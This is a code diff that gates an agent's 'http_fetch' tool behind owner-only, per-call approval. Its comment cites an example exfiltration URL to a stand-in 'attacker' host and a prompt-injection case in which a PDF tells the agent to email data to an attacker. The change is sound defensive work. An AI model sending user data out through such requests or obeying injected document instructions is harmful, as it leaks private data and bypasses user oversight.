@@ -2821,8 +2821,18 @@ export const TOOLS: ToolDef[] = [
   },
   {
     name: "http_fetch",
+    // A raw request with a caller-chosen URL, method, headers and body is an
+    // exfiltration channel, not a read: "GET https://attacker/?data=<customer
+    // list>" leaks just as well as a POST. Untagged it was ungrouped and
+    // unflagged, so it ran in EVERY mode — including Plan mode, which promises
+    // no changes at all — with no approval, which made the documented
+    // prompt-injection guarantee ("a PDF that says email this to attacker@…
+    // can't trigger anything") untrue for this one tool. read_web_page stays
+    // ungated for ordinary reading; this is the power tool.
+    ownerOnly: true,
+    sensitive: true,
     description:
-      "Make a raw HTTP request like curl and return the status and body. Use for APIs or endpoints read_web_page can't reach. Public http(s) URLs only; GET by default, pass method and body for POST/PUT.",
+      "Make a raw HTTP request like curl and return the status and body. Use for APIs or endpoints read_web_page can't reach. Public http(s) URLs only; GET by default, pass method and body for POST/PUT. OWNER-ONLY and confirmed each call — for plain page reading use read_web_page, which needs no approval.",
     parameters: {
       type: "object",
       properties: {
